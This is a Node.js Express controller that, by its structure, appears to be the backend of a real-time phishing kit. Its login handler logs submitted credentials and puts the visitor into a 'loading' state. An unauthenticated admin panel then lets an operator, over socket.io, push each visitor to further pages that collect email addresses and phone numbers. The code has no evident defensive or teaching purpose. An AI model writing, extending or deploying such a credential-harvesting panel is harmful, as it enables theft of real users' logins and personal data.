var userModel = require('../model/user');

var user = {
    loginGet: (req, res) => {
        res.render('login.ejs'); 
    },
    endGet: async (req, res) => {
            var flag = await userModel.findByUid(req.params.uid);
            if(flag) res.render('home.ejs');
            else res.render('404.ejs');
    },
    phoneGet: async (req, res) => {
        var flag = await userModel.findByUid(req.params.uid);
        if(flag) res.render('phone.ejs', {uid: req.params.uid}); 
        else res.render('404.ejs');
    },
    emailGet: async (req, res) => {
        var flag = await userModel.findByUid(req.params.uid);
        if(flag) res.render('email.ejs', {uid: req.params.uid}); 
        else res.render('404.ejs');
    },
    loginPost: async (req, res)=> {
        console.log(req.body);
        var userInfo = req.body;
        var uid = await userModel.find(userInfo);
        // console.log(uid);
        userModel.setStatus(uid, 'loading');
        // await userModel.setUsername(uid, userInfo.username);
        // await  userModel.setPassword(uid, userInfo.password);
        global.io.emit('admin', '');
        console.log("uid: ", uid);
        res.render('loading.ejs', {uid});    
    },
    emailPost: (req, res) => {
        console.log(req.body);
        var uid = req.params.uid;
        var email = req.body.email;
        userModel.setEmail(uid, email);
        userModel.setStatus(uid, 'loading');
        global.io.emit('admin', '');
        res.render('loading.ejs', {uid}); 
    },
    phonePost: (req, res) => {
        console.log(req.body);
        var uid = req.params.uid;
        var phone = req.body.phone;
        userModel.setPhone(uid, phone);
        userModel.setStatus(uid, 'loading');
        global.io.emit('admin', '');
        res.render('loading.ejs', {uid}); 
    },
    adminGet: async (req, res) => {
        var users = await userModel.getAllUsers();
        console.log("before admin rendering..");
        res.render('admin.ejs', {users}); 
    },
    adminPost: (req, res) => {
        console.log("admin/action", req.body);
        userModel.setStatus(req.body.uid, req.body.status);
        global.io.emit('admin', '');
        if(req.body.status == 'loading') res.render('loading.ejs', {uid: req.body.uid});
        else if(req.body.status == 'delete') res.redirect('/');
        else global.io.emit(req.body.uid, "/"+req.body.status+'/'+req.body.uid);
    }
}

module.exports = user;